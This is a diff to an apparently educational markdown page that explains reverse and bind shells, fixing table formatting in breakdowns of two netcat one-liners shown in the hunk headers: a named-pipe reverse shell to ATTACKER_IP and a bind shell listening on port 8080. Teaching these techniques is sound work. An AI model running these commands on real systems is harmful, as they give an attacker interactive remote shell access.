@@ -103,8 +103,8 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_P
 | `rm -f /tmp/f`                             | Remove any old pipe file named **f** in `/tmp/`.                        |
 | `mkfifo /tmp/f`                            | Create a new **named pipe** at `/tmp/f` for communication.              |
 | `cat /tmp/f`                               | Read input data from the pipe.                                          |
-| `| sh -i 2>&1`                             | Send input into an interactive shell, redirecting errors to output.     |
-| `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`   | Send shell output to attacker’s Netcat listener over network.           |
+| ` sh -i 2>&1`                             | Send input into an interactive shell, redirecting errors to output.     |
+| ` nc ATTACKER_IP ATTACKER_PORT >/tmp/f`   | Send shell output to attacker’s Netcat listener over network.           |
 | `>/tmp/f`                                  | Write attacker’s commands back into the pipe (2-way communication).     |
 
 
@@ -179,8 +179,8 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /t
 | `rm -f /tmp/f`                           | Remove any old pipe file in `/tmp/`.                                    |
 | `mkfifo /tmp/f`                          | Create a new **named pipe** for communication.                          |
 | `cat /tmp/f`                             | Read input data from the pipe.                                          |
-| `| bash -i 2>&1`                         | Start an interactive bash shell, redirecting errors to output.          |
-| `| nc -l 0.0.0.0 8080`                   | Start Netcat in **listen mode** on port `8080`.                         |
+| ` bash -i 2>&1`                         | Start an interactive bash shell, redirecting errors to output.          |
+| ` nc -l 0.0.0.0 8080`                   | Start Netcat in **listen mode** on port `8080`.                         |
 | `>/tmp/f`                                | Send output of commands back into the pipe (2-way communication).       |
 
 👉 After running this, the target system **waits for connections** on port `8080`.  
